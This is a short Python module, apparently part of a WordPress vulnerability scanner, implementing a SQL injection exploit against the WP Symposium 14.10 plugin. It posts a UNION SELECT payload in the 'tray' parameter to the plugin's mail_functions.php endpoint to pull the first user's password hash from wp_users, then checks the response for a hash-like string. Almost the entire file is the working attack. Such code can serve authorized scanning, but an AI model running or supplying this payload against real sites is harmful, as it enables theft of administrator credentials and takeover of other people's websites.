from ..exploitsql import ExploitSql


class SymposiumSQL(ExploitSql):
    exploit_info = {
        'exploit_name': 'WP Symposium',
        'exploit_version': '14.10',
        'exploit_url': 'http://www.exploit-db.com/exploits/35543/'
    }

    # TODO verify exploit is returning a 34 character md5
    def exploit(self):
        exploit = {
            'mid': '1',
            'tray': 'in_deleted%20=%201%20UNION%20(SELECT%20user_pass%20FROM%20wp_users%20WHERE%20ID=1)%20LIMIT%201,%201%20--'
        }
        response = ExploitSql.request(
            self.hostname + '/wp-content/plugins/wp-symposium/ajax/mail_functions.php',
            data=exploit, method='POST', urlencode=True)

        if response is not None and len(response) == 34 and '$' in response:
            self.exploitfound(self.exploit_info)
        else:
            self.exploitnotfound(self.exploit_info)
